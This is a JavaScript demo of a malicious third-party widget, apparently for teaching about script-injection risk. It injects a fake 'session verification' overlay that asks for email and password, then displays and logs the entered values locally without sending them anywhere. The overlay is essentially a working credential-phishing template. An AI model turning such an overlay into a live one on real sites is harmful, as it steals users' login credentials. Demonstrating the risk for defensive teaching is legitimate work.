/**
 * Attack Demo: malicious third-party campaign widget
 * Safe demo only: injects a fake re-auth modal and displays entered values locally.
 * It does NOT send data anywhere.
 */
(function () {
    console.log('[Attacker] Malicious campaign widget loaded.');

    function showFakeReauth() {
        if (document.getElementById('fake-reauth-overlay')) return;

        const overlay = document.createElement('div');
        overlay.id = 'fake-reauth-overlay';
        overlay.style.position = 'fixed';
        overlay.style.inset = '0';
        overlay.style.background = 'rgba(0, 0, 0, 0.72)';
        overlay.style.zIndex = '99999';
        overlay.style.display = 'flex';
        overlay.style.alignItems = 'center';
        overlay.style.justifyContent = 'center';
        overlay.style.padding = '20px';

        overlay.innerHTML = `
            <div style="width:100%; max-width:420px; background:#ffffff; border-radius:16px; padding:24px; box-shadow:0 12px 40px rgba(0,0,0,0.28); font-family:Arial, sans-serif;">
                <div style="display:flex; align-items:center; justify-content:space-between; gap:12px; margin-bottom:10px;">
                    <h2 style="margin:0; font-size:22px; color:#111827;">Session verification required</h2>
                    <span style="font-size:12px; color:#b91c1c; font-weight:bold;">DEMO</span>
                </div>
                <p style="margin:0 0 16px; color:#374151; line-height:1.6;">
                    Your session could not be validated. Please re-enter your account information to continue reading premium articles.
                </p>
                <form id="fake-reauth-form">
                    <label style="display:block; margin-bottom:6px; font-size:14px; color:#374151;">Email</label>
                    <input id="fake-email" type="email" placeholder="name@example.com"
                        style="width:100%; padding:10px 12px; margin-bottom:12px; border:1px solid #d1d5db; border-radius:8px; box-sizing:border-box;">

                    <label style="display:block; margin-bottom:6px; font-size:14px; color:#374151;">Password</label>
                    <input id="fake-password" type="password" placeholder="Password"
                        style="width:100%; padding:10px 12px; margin-bottom:14px; border:1px solid #d1d5db; border-radius:8px; box-sizing:border-box;">

                    <div style="display:flex; gap:10px;">
                        <button type="submit"
                            style="flex:1; padding:10px 12px; background:#111827; color:#fff; border:none; border-radius:8px; cursor:pointer;">
                            Verify session
                        </button>
                        <button type="button" id="fake-close-btn"
                            style="padding:10px 12px; background:#e5e7eb; color:#111827; border:none; border-radius:8px; cursor:pointer;">
                            Close
                        </button>
                    </div>
                </form>
                <div id="captured-output"
                    style="margin-top:16px; padding:12px; background:#f9fafb; border:1px dashed #d1d5db; border-radius:8px; color:#111827; font-size:14px;">
                    No input captured yet.
                </div>
                <p style="margin:12px 0 0; font-size:12px; color:#6b7280; line-height:1.5;">
                    Demo only: this script shows how a malicious third-party script could inject a fake re-authentication prompt into the page.
                </p>
            </div>
        `;

        document.body.appendChild(overlay);

        const form = document.getElementById('fake-reauth-form');
        const closeBtn = document.getElementById('fake-close-btn');
        const output = document.getElementById('captured-output');

        form.addEventListener('submit', function (event) {
            event.preventDefault();
            const email = document.getElementById('fake-email').value;
            const password = document.getElementById('fake-password').value;

            output.textContent = `Demo capture -> email: ${email || '(empty)'} / password: ${password || '(empty)'}`;
            console.log('[Attacker] Demo captured values:', { email, password });
        });

        closeBtn.addEventListener('click', function () {
            overlay.remove();
        });
    }

    document.addEventListener('DOMContentLoaded', function () {
        const container = document.getElementById('campaign-widget-container');
        if (!container) return;

        const widget = document.createElement('div');
        widget.className = 'campaign-widget';
        widget.innerHTML = `
            <div class="campaign-content">
                <h3>⚠️ Security check available</h3>
                <p>Please verify your account session for premium access.</p>
            </div>
            <a href="#" class="campaign-btn" id="malicious-campaign-btn">Verify Now</a>
        `;

        setTimeout(function () {
            container.appendChild(widget);
            const trigger = document.getElementById('malicious-campaign-btn');
            if (trigger) {
                trigger.addEventListener('click', function (event) {
                    event.preventDefault();
                    showFakeReauth();
                });
            }
            setTimeout(showFakeReauth, 1200);
        }, 600);
    });
})();